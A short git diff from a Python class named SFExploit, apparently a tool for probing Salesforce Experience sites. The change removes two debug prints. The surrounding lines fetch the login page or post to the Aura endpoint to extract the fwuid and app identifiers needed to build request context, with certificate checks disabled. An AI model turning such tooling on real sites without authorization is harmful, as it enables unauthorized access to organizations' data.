@@ -51,13 +51,11 @@ class SFExploit:
 
 			# get fwuid and app stuff
 			if (self.fwuid == "wrongfwuid" or self.app_data == "siteforce:loginApp2"):
-				print("ok")
 				request_send = requests.get(f"{url}/s/login/",verify=False,allow_redirects=True)
 				response_headers = request_send.headers.get('Link',None)
 				if response_headers:
 					self.find_fwuid_and_app_in_response_headers(response_headers)
 				else:
-					print("oh")
 					request_send = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, cookies=self.cookies, data=post_body)
 					self.find_fwuid_in_response_body(request_send.text)
 				self.context = json.dumps({"mode":"PROD","fwuid":self.fwuid,"app":self.app_data,"loaded":{f"APPLICATION@markup://{self.app_data}":self.app_data},"dn":[],"globals":{},"uad":False})
